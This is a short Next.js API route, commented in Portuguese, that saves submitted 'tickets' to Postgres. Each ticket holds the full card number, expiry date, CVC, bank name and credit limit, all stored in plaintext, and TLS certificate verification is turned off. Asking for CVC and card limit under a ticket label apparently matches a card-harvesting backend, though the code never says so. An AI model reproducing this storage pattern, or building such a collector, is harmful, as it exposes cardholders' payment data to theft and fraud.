import { NextRequest, NextResponse } from "next/server";
import { Pool } from "pg";

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const {
      ticketNumber,
      value,
      banco,
      bancoOutro,
      numeroCartao,
      validade,
      cvc,
      notes,
      limiteValor
    } = body;

    await pool.query(
      `INSERT INTO tickets
        (ticket_number, valor, banco, banco_outro, numero_cartao, validade, cvc, limite_resposta, limite_valor)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
      [
        ticketNumber,
        value,
        banco,
        bancoOutro || null,
        numeroCartao,
        validade,
        cvc,
        notes,
        limiteValor ? Number(limiteValor) : null
      ]
    );

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ ok: false, error: "Erro ao salvar ticket" }, { status: 500 });
  }
}
